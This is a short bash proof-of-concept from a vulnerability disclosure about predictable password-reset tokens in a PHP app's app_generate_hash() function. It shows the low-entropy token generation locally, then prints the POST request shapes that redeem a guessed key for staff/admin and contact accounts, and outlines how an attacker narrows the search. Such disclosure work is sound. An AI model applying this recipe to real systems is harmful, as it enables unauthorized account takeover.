#!/usr/bin/env bash
# VULN-02 — Predictable reset/set-password token brute-force (concept)
# Researcher: tal7aouy
# This demonstrates the weakness of app_generate_hash() locally, then shows the
# request shape used to redeem a guessed key. It does NOT attack a live host.
set -euo pipefail

echo "[*] VULN-02 — demonstrating token predictability of app_generate_hash()"
php -r '
function app_generate_hash(){ return md5(rand() . microtime() . time() . uniqid()); }
// Show that consecutive tokens are derived from observable, low-entropy inputs.
for ($i=0;$i<3;$i++){ echo app_generate_hash().PHP_EOL; }
echo "-- inputs: rand()=".rand()." time()=".time()." uniqid()=".uniqid().PHP_EOL;
'

cat <<TXT

[*] Redemption request shape once a candidate key is found:

    Staff/admin (48h window):
      POST /admin/authentication/set_password/1/<staffid>/<candidate_key>
      Body: password=NewPass123!&passwordr=NewPass123!

    Contact (1h window):
      POST /authentication/reset_password/0/<userid>/<candidate_key>
      Body: password=NewPass123!&passwordr=NewPass123!

[*] A real attacker constrains time() via the HTTP Date header and searches the
    residual rand()/uniqid() space offline, then submits candidates in the window.
TXT
